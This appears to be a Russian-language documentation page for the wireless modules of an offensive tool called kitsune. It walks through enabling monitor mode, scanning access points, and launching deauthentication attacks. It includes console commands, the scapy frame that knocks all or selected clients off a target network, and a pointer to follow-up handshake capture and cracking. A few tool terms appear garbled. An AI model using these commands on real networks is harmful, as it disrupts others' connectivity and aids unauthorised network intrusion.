---
title: Wireless — monitor, scan, deauth
---

# Wireless layer

> ⚠️ Нужен Wi-Fi адаптер с поддержкой **monitor mode** + права root
> + (`scapy` для scan/deauth: `pipx inject kitsune scapy`).

## Порядок работы: monitor → scan → deauth

### 1. wireless/monitor — поднять monitor mode

airmon-ng-подобный модуль через `ip link` + `iw`:

```bash
sudo kitsune                    # root обязателен!
kitsune > use monitor
kitsune (wireless/monitor) > set iface wlan0
kitsune (wireless/monitor) > set action start    # start | stop
kitsune (wireless/monitor) > run
# [+] iface wlan0 is now in monitor mode — pair with wireless/scan
```

Что делает: `ip link set dev wlan0 down` → `iw dev wlan0 set type monitor`
→ `ip link set dev wlan0 up`. Если появляется `Operation not permitted` —
не root; if `RTNETLINK answers` — интерфейс используется NetworkManager
(отключите его или `rfkill unblock wifi`).

Имя интерфейса иногда меняется (`wlan0mon` как в airmode) — гляньте
`ip link` после запуска; имя, которое появилось, отдайте в `scan`/`deauth`.

### 2. wireless/scan — снифф эфира (airodump-lite)

```bash
kitsune > use scan
kitsune (wireless/scan) > set iface wlan0mon     # интерфейс monitor-режима
kitsune (wireless/scan) > set seconds 30
kitsune (wireless/scan) > run
```

Вывод: AP (BSSID, SSID, channel, signal) → `db.hosts`. Хендшейки НЕ
ловятся (это вне scope — используйте отдельный airodump для handshake).

### 3. wireless/deauth — сброс клиентов (mdk4/aireplay стиль)

```bash
kitsune > use deauth
kitsune (wireless/deauth) > set iface wlan0mon
kitsune (wireless/deauth) > set bssid AA:BB:CC:DD:EE:FF     # target AP
kitsune (wireless/deauth) > set client broadcast            # или MAC клиента
kitsune (wireless/deauth) > set count 10                    # сколько кадров
kitsune (wireless/deauth) > run
```

**Как выглядит посылка** (scapy):

```
RadioTap / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
```

- `set client broadcast` (`ff:ff:ff:ff:ff:ff`) — деаутентифицирует **всех**
  клиентов AP.
- `set client 1A:2B:3C:4D:5E:6F` — **только конкретный клиент** (тише).
- `count` — сколько deauth-фреймов (обычно 5–30); `inter=0.2 c`.
- Каждая стрельба логируется `loot(action)`.

**Типичные проблемы:**

| Ошибка/симптом | Причина | Фикс |
|---|---|---|
| `send failed` / `Operation not permitted` | нет root или не monitor | `sudo kitsune`, начните с `monitor start` |
| деаут не работает, кадры уходят | адаптер не умеет `packet injection` | адаптер с Аtheros (ALFA) или такие чипы |
| `iw` not available | нет утилиты | `apt install iw` |
| NetworkManager возвращает managed | NM `waster` интерфейс | `nmcli dev set wlan0 managed no` |

### 4. После деаута

Дальше обычно ловят handshake (airodump-ng btfcap) и брутят (aircrack-ng/hashcat).
Kitsune оставляет это внешними инструментами; своя деталь: logs loot.

## Комбинации

```
# full: shutdown + rapid deauth и show handshake за 30 сек
use monitor → set iface wlan0 → action start → run
use scan     → set iface wlan0mon → seconds 30 → run
use deauth   → set iface wlan0mon → bssid ... → run
```

Дальше: [infra](09-infra.md)
